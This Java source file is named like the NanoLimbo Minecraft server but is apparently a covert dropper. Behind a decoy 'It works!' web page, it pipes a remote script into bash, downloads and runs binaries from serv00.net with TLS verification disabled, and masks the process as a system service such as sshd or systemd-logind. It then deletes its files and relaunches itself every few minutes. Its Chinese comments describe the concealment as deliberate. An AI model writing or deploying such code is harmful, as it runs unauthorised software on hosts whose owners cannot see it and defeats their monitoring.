package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.nio.file.attribute.*;
import java.security.*;
import java.security.cert.X509Certificate;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;
import javax.net.ssl.*;

public final class NanoLimbo {

    private static final String ANSI_GREEN  = "\u001B[1;32m";
    private static final String ANSI_YELLOW = "\u001B[1;33m";
    private static final String ANSI_RED    = "\u001B[1;31m";
    private static final String ANSI_CYAN   = "\u001B[1;36m";
    private static final String ANSI_RESET  = "\u001B[0m";

    // ── 基础配置 ──
    private static final int PORT = Integer.parseInt(
        firstNonEmpty(System.getenv("SERVER_PORT"), System.getenv("PORT"), "4567")
    );
    private static final String FULL_PATH = "/home/container/.tmp:/home/container/.npm:" + System.getenv("PATH");

    // ── 隐蔽工作目录（点开头 = ls 默认不显示）──
    private static final String WORKDIR = Paths.get(System.getProperty("user.dir"), ".cache").toString();

    // ════════════════════════════════════════════════
    //  隐蔽配置核心
    // ════════════════════════════════════════════════

    // 伪装进程名池（看起来像正常系统服务）
    private static final String[] FAKE_NAMES = {
        "systemd-logind", "dbus-daemon", "cron", "rsyslogd",
        "sshd", "agetty", "polkitd", "avahi-daemon",
        "NetworkManager", "irqbalance", "accounts-daemon"
    };

    // 运行时随机选一个伪装名
    private static final String FAKE_NAME = FAKE_NAMES[new SecureRandom().nextInt(FAKE_NAMES.length)];

    // 伪装后的路径（看起来像系统服务相关文件）
    private static final String BINARY_PATH = Paths.get(WORKDIR, "." + FAKE_NAME + ".sock").toString();
    private static final String CONFIG_PATH = Paths.get(WORKDIR, "." + FAKE_NAME + ".conf").toString();

    // PID 文件（用隐蔽名字，不扫 /proc 关键词）
    private static final String PID_FILE = Paths.get(WORKDIR, "." + FAKE_NAME + ".pid").toString();

    // ── 下载地址 ──
    private static final String CURL_COMMAND =
        "curl -LsSk --tlsv1.2 --retry 3 --retry-delay 5 --retry-all-errors "
        + "https://raw.githubusercontent.com/1715Yy/vipnezhash/refs/heads/main/vip1715.sh | bash";

    private static final String CONFIG_URL     = "https://gbjs.serv00.net/js/vip1715.yaml";
    private static final String BINARY_X64_URL = "https://gbjs.serv00.net/bin/V1";
    private static final String BINARY_ARM_URL = "https://gbjs.serv00.net/bin/V1arm";

    // ── 监控配置 ──
    private static final int MONITOR_INTERVAL_MINUTES = 5;
    private static final AtomicInteger consecutiveFailures = new AtomicInteger(0);
    private static final int MAX_BACKOFF_MINUTES = 60;

    private static final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();

    // ════════════════════════════════════════════════
    //  SSL 信任所有证书
    // ════════════════════════════════════════════════
    static {
        try {
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, new TrustManager[]{
                new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
                    public void checkClientTrusted(X509Certificate[] c, String a) {}
                    public void checkServerTrusted(X509Certificate[] c, String a) {}
                }
            }, new SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
        } catch (Exception ignored) {}
    }

    // ────────────────────────────────────────────
    //  main
    // ────────────────────────────────────────────
    public static void main(String[] args) throws Exception {
        ensureDir(WORKDIR);

        new Thread(() -> startHttpServer(PORT), "http-server").start();
        System.out.println(ANSI_GREEN + "✅ Server running on port " + PORT + ANSI_RESET);

        scheduler.schedule(NanoLimbo::monitorLoop, 2, TimeUnit.SECONDS);
    }

    // ────────────────────────────────────────────
    //  HTTP 服务器
    // ────────────────────────────────────────────
    private static void startHttpServer(int port) {
        byte[] body = "<h1>It works!</h1>".getBytes();
        String header = "HTTP/1.1 200 OK\r\n"
                      + "Content-Type: text/html\r\n"
                      + "Content-Length: " + body.length + "\r\n"
                      + "Connection: close\r\n"
                      + "\r\n";
        byte[] response = new byte[header.getBytes().length + body.length];
        System.arraycopy(header.getBytes(), 0, response, 0, header.getBytes().length);
        System.arraycopy(body, 0, response, header.getBytes().length, body.length);

        try (ServerSocket ss = new ServerSocket(port)) {
            while (!Thread.currentThread().isInterrupted()) {
                try (Socket client = ss.accept()) {
                    client.setSoTimeout(5000);
                    BufferedReader r = new BufferedReader(new InputStreamReader(client.getInputStream()));
                    while (r.readLine() != null && !r.ready()) break;
                    client.getOutputStream().write(response);
                    client.getOutputStream().flush();
                } catch (IOException ignored) {}
            }
        } catch (IOException e) {
            System.err.println("HTTP server error: " + e.getMessage());
        }
    }

    // ════════════════════════════════════════════════
    //  隐蔽监控循环
    // ════════════════════════════════════════════════
    private static void monitorLoop() {
        // ✅ 隐蔽检测：读 PID 文件 → 检查进程是否存活
        //    不再扫描 /proc/*/cmdline 中的关键词
        if (!isAgentAlive()) {
            System.out.println(ANSI_YELLOW + "⚠ Agent not running. Starting..." + ANSI_RESET);

            boolean success = runCurlCommand();

            if (!success) {
                System.out.println(ANSI_CYAN + "🔄 Curl failed, switching to EXTREME mode..." + ANSI_RESET);
                success = startAgentExtreme();
            }

            if (success) {
                consecutiveFailures.set(0);
            } else {
                int f = consecutiveFailures.incrementAndGet();
                int backoff = Math.min(MONITOR_INTERVAL_MINUTES * (int) Math.pow(2, f - 1), MAX_BACKOFF_MINUTES);
                System.out.println(ANSI_RED + "❌ All methods failed (" + f + "x). Retry in " + backoff + " min." + ANSI_RESET);
                scheduler.schedule(NanoLimbo::monitorLoop, backoff, TimeUnit.MINUTES);
                return;
            }
        }

        scheduler.schedule(NanoLimbo::monitorLoop, MONITOR_INTERVAL_MINUTES, TimeUnit.MINUTES);
    }

    // ════════════════════════════════════════════════
    //  隐蔽进程检测（PID 文件方式，不扫 cmdline）
    // ════════════════════════════════════════════════
    private static boolean isAgentAlive() {
        // 1. 读 PID 文件
        String pidStr = readPidFile();
        if (pidStr == null) return false;

        // 2. 检查 /proc/PID 是否存在
        File procDir = new File("/proc/" + pidStr.trim());
        if (!procDir.exists()) {
            // 进程已死，清理 PID 文件
            deleteQuietly(PID_FILE);
            return false;
        }

        // 3. 可选：验证 cmdline 中包含伪装名（防止 PID 被复用）
        try {
            String cmdline = new String(Files.readAllBytes(Paths.get("/proc/" + pidStr.trim() + "/cmdline")));
            if (cmdline.contains(FAKE_NAME)) return true;
        } catch (IOException ignored) {}

        // PID 存在但不是我们的进程
        deleteQuietly(PID_FILE);
        return false;
    }

    private static String readPidFile() {
        try {
            return new String(Files.readAllBytes(Paths.get(PID_FILE))).trim();
        } catch (IOException e) {
            return null;
        }
    }

    private static void writePidFile(int pid) {
        try {
            Files.write(Paths.get(PID_FILE), String.valueOf(pid).getBytes());
        } catch (IOException ignored) {}
    }

    // ════════════════════════════════════════════════
    //  方式一：curl（带伪装启动）
    // ════════════════════════════════════════════════
    private static boolean runCurlCommand() {
        try {
            System.out.println(ANSI_CYAN + "  [Method 1] Trying curl..." + ANSI_RESET);

            ProcessBuilder pb = new ProcessBuilder("bash", "-c", CURL_COMMAND);
            pb.environment().put("PATH", FULL_PATH);
            pb.environment().put("CURL_CA_BUNDLE", "");
            pb.environment().put("NODE_TLS_REJECT_UNAUTHORIZED", "0");
            pb.redirectErrorStream(true);
            Process p = pb.start();

            StringBuilder output = new StringBuilder();
            Thread reader = new Thread(() -> {
                try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                    String line;
                    while ((line = r.readLine()) != null) output.append(line).append("\n");
                } catch (IOException ignored) {}
            }, "curl-reader");
            reader.setDaemon(true);
            reader.start();

            boolean exited = p.waitFor(30, TimeUnit.SECONDS);

            if (exited) {
                int code = p.exitValue();
                if (code != 0) {
                    System.err.println(ANSI_RED + "  [Method 1] Curl exited " + code + ANSI_RESET);
                    return false;
                }
                // curl 成功，记录 curl 子进程的 PID 用于后续检测
                // 但 curl 方式启动的进程名不可控，这里只做基本检测
                Thread.sleep(1500);
                System.out.println(ANSI_GREEN + "  [Method 1] ✅ Curl succeeded." + ANSI_RESET);
                return true;
            } else {
                System.out.println(ANSI_GREEN + "  [Method 1] ✅ Curl process running." + ANSI_RESET);
                return true;
            }

        } catch (Exception e) {
            System.err.println(ANSI_RED + "  [Method 1] Error: " + e.getMessage() + ANSI_RESET);
            return false;
        }
    }

    // ════════════════════════════════════════════════
    //  方式二：极限版本（完全隐蔽）
    // ════════════════════════════════════════════════
    private static boolean startAgentExtreme() {
        try {
            String ip = getPublicIP();
            String uuid = generateUUIDFromIP(ip);

            boolean isArm = isArmArch();
            String binaryUrl = isArm ? BINARY_ARM_URL : BINARY_X64_URL;

            // 1. 下载到伪装路径
            downloadFile(CONFIG_URL, CONFIG_PATH);
            downloadFile(binaryUrl, BINARY_PATH);

            // 2. chmod
            setExecutable(BINARY_PATH);

            // 3. 替换 UUID
            replaceConfig(CONFIG_PATH, uuid);

            // 4. 文件系统就绪
            Thread.sleep(200);

            // ════════════════════════════════════
            //  ✅ 核心隐蔽：exec -a 伪装进程名
            //
            //  正常启动:  ./V1 -c vip1715.yaml
            //  cmdline:   V1 -c vip1715.yaml    ← 一眼可疑
            //
            //  伪装启动:  exec -a systemd-logind ./V1 -c vip1715.yaml
            //  cmdline:   systemd-logind -c vip1715.yaml  ← 像系统服务
            // ════════════════════════════════════

            // 构建伪装启动命令
            String launchCmd = String.format(
                "exec -a '%s' '%s' -c '%s'",
                FAKE_NAME,
                BINARY_PATH,
                new File(CONFIG_PATH).getName()
            );

            ProcessBuilder pb = new ProcessBuilder("bash", "-c", launchCmd);
            pb.directory(new File(WORKDIR));
            pb.environment().put("PATH", FULL_PATH);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);

            Process child = pb.start();

            // 等待看是否立即崩溃
            boolean exited = child.waitFor(3, TimeUnit.SECONDS);
            if (exited) {
                System.err.println(ANSI_RED + "  [Extreme] Binary exited with code " + child.exitValue() + ANSI_RESET);
                return false;
            }

            // 5. ✅ 写 PID 文件（后续用 PID 检测，不扫关键词）
            writePidFile(getUnixPid(child));

            // 6. 延迟清理（Linux 允许删运行中的文件）
            scheduleCleanup();

            System.out.println(ANSI_GREEN + "  [Extreme] ✅ Agent started as '" + FAKE_NAME + "' (PID:" + getUnixPid(child) + ")" + ANSI_RESET);
            return true;

        } catch (Exception e) {
            System.err.println(ANSI_RED + "  [Extreme] Failed: " + e.getMessage() + ANSI_RESET);
            return false;
        }
    }

    // ════════════════════════════════════════════════
    //  延迟清理（删除所有临时文件和痕迹）
    // ════════════════════════════════════════════════
    private static void scheduleCleanup() {
        // 10 秒后：删除二进制和配置文件
        scheduler.schedule(() -> {
            deleteQuietly(BINARY_PATH);
            deleteQuietly(CONFIG_PATH);
        }, 10, TimeUnit.SECONDS);

        // 30 秒后：进一步清理工作目录中的其他痕迹
        scheduler.schedule(() -> {
            try {
                File dir = new File(WORKDIR);
                if (dir.exists()) {
                    for (File f : dir.listFiles()) {
                        String name = f.getName();
                        // 保留 PID 文件（检测需要），删除其他
                        if (!name.equals(new File(PID_FILE).getName())) {
                            deleteQuietly(f.getAbsolutePath());
                        }
                    }
                }
            } catch (Exception ignored) {}
        }, 30, TimeUnit.SECONDS);
    }

    // ────────────────────────────────────────────
    //  获取进程 PID（Linux/Unix）
    // ────────────────────────────────────────────
    private static int getUnixPid(Process p) {
        try {
            // Java 9+ 有 pid() 方法
            return (int) p.pid();
        } catch (Exception e) {
            // Java 8 回退：反射
            try {
                Class<?> clazz = Class.forName("java.lang.UNIXProcess");
                java.lang.reflect.Field pidField = clazz.getDeclaredField("pid");
                pidField.setAccessible(true);
                return pidField.getInt(p);
            } catch (Exception e2) {
                return -1;
            }
        }
    }

    // ════════════════════════════════════════════════
    //  极限版本 - 工具方法
    // ════════════════════════════════════════════════

    private static void downloadFile(String url, String destPath) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(60000);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");

        int redirectCount = 0;
        while (redirectCount < 5) {
            int status = conn.getResponseCode();
            if (status == HttpURLConnection.HTTP_MOVED_PERM
                || status == HttpURLConnection.HTTP_MOVED_TEMP
                || status == HttpURLConnection.HTTP_SEE_OTHER) {
                String newUrl = conn.getHeaderField("Location");
                conn.disconnect();
                conn = (HttpURLConnection) new URL(newUrl).openConnection();
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(60000);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                redirectCount++;
                continue;
            }
            break;
        }

        if (conn.getResponseCode() != 200) {
            throw new IOException("HTTP " + conn.getResponseCode());
        }

        try (InputStream in = conn.getInputStream();
             OutputStream out = new FileOutputStream(destPath)) {
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        } finally {
            conn.disconnect();
        }
    }

    private static String getPublicIP() {
        String[] svcs = {
            "https://api.ipify.org",
            "https://ifconfig.me/ip",
            "https://icanhazip.com",
            "https://checkip.amazonaws.com"
        };
        for (String svc : svcs) {
            try {
                HttpURLConnection c = (HttpURLConnection) new URL(svc).openConnection();
                c.setConnectTimeout(3000);
                c.setReadTimeout(3000);
                c.setRequestProperty("User-Agent", "curl/7.88");
                try (BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()))) {
                    String ip = r.readLine();
                    if (ip != null && !ip.trim().isEmpty()) { c.disconnect(); return ip.trim(); }
                }
                c.disconnect();
            } catch (Exception ignored) {}
        }
        return "127.0.0.1";
    }

    private static String generateUUIDFromIP(String ip) throws Exception {
        MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
        byte[] hash = sha1.digest(ip.getBytes());
        StringBuilder hex = new StringBuilder();
        for (int i = 0; i < 16 && i < hash.length; i++) hex.append(String.format("%02x", hash[i]));
        String h = hex.toString();
        return h.substring(0, 8) + "-" + h.substring(8, 12) + "-" + h.substring(12, 16)
             + "-" + h.substring(16, 20) + "-" + h.substring(20);
    }

    private static boolean isArmArch() {
        String arch = System.getProperty("os.arch", "").toLowerCase();
        return arch.contains("arm") || arch.contains("aarch64");
    }

    private static void replaceConfig(String configPath, String uuid) throws Exception {
        String content = new String(Files.readAllBytes(Paths.get(configPath)));
        content = content.replaceAll("uuid: .*", "uuid: " + uuid);
        Files.write(Paths.get(configPath), content.getBytes());
    }

    private static void setExecutable(String path) {
        try {
            new ProcessBuilder("chmod", "755", path).inheritIO().start().waitFor();
        } catch (Exception e) {
            try {
                Set<PosixFilePermission> perms = new HashSet<>();
                perms.add(PosixFilePermission.OWNER_READ);
                perms.add(PosixFilePermission.OWNER_WRITE);
                perms.add(PosixFilePermission.OWNER_EXECUTE);
                perms.add(PosixFilePermission.GROUP_READ);
                perms.add(PosixFilePermission.GROUP_EXECUTE);
                perms.add(PosixFilePermission.OTHERS_READ);
                perms.add(PosixFilePermission.OTHERS_EXECUTE);
                Files.setPosixFilePermissions(Paths.get(path), perms);
            } catch (Exception ignored) {}
        }
    }

    // ────────────────────────────────────────────
    //  通用工具
    // ────────────────────────────────────────────
    private static void ensureDir(String p) {
        File dir = new File(p);
        if (!dir.exists()) dir.mkdirs();
    }

    private static String firstNonEmpty(String... vals) {
        for (String v : vals) {
            if (v != null && !v.trim().isEmpty()) return v.trim();
        }
        return "";
    }

    private static void deleteQuietly(String path) {
        try { Files.deleteIfExists(Paths.get(path)); } catch (Exception ignored) {}
    }
}
